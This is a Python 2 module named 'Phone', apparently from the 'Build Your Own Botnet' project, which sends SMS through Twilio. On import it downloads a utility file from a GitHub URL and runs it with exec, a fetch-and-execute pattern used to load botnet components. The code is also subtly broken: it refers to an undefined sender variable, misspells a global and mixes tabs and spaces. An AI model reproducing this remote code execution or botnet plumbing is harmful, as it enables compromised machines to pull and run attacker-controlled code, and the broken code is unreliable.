#!/usr/bin/python
# -*- coding: utf-8 -*-
'Phone (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import urllib

# utilities
util = imp.new_module('util')
exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
sys.modules['util'] = util

# globals
packages  = ['twilio']
platforms = ['win32','linux2','darwin']
usage     = 'phone <account_sid> <auth_token> <phone_number> [message]'
commnad   = True

# setup
util.is_compatible(platforms, __name__)
util.imports(packages)

# main
def run(account_sid, auth_token, phone_number, message):
    try:
        if 'twilio' in globals():
            phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
            cli = twilio.rest.Client(account_sid, auth_token)
            msg = cli.api.account.messages.create(to=phone_number, from_=phone, body=message)
            return "SUCCESS: text message sent to {}".format(phone_number)
	else:
            raise ImportError("missing package 'twilio' is required for module 'phone'")
    except Exception as e:
        return "{} error: {}".format(run.func_name, str(e))

